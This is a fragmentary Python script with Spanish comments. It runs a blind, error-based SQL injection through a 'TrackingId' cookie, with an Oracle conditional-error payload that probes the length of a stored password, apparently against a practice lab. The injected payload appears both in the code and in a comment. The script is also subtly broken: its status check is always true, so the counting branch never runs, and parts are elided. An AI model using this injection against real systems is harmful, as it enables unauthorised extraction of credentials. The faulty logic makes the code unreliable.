...
def length_password():  #funcion que descubre el largo de la password
    ...
    while(flag):#en el TrackingId ocurre la magia al injectar querys, en esta funcion se utiliza para verificar el largo de la password 
        cookies={
            'TrackingId': "tCaq3HnmgvxszEhG'||(select case when (1=1) then to_char(1/0) else '' end from users where rownum=1 and length(password)>%d)||'" % (counter),
            'session': 'L99L7Jk4kGgoacB5VgHAUSeLGZukmy59'
        ...
        #||(select case when (1=1) then to_char(1/0) else '' end from users where rownum=1 and length(password)>20)||'
        pb.status(cookies['TrackingId'])# actualiza la barra de progreso, quiero ver el TackingId 
    

        r = requests.get(main_url,cookies=cookies)

        if(r.status_code):# codigo de estado 200
            flag=False
            
        elif r.status_code == 500: #codigo de estado 500
            counter = counter + 1
   
    #return counter
    print('El largo de la password es: '+str(counter))
    print(r)
